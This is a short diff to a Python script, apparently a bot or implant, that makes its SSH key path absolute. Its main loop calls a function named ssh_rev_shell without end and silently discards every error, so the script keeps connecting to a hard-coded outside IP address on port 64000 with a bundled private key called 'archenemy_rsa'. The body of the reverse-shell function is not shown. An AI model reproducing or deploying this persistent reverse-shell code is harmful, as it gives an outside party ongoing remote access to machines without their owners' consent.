@@ -14,6 +14,8 @@ import threading
 import paramiko
 import subprocess
 
+parent_dir = os.path.dirname(os.path.abspath(__file__))
+
 
 # Global variables to track SSH client and session
 ssh_client = None
@@ -144,11 +146,12 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 if __name__ == "__main__":
 
     #global user
+    auth_path = os.path.join(parent_dir, 'archenemy_rsa')
 
     # Try forever the commands
     while True:
         try:
-            ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
+            ssh_rev_shell('34.204.78.186', 'ubuntu', auth_path, user, 64000)
         except Exception as e:
             pass
 
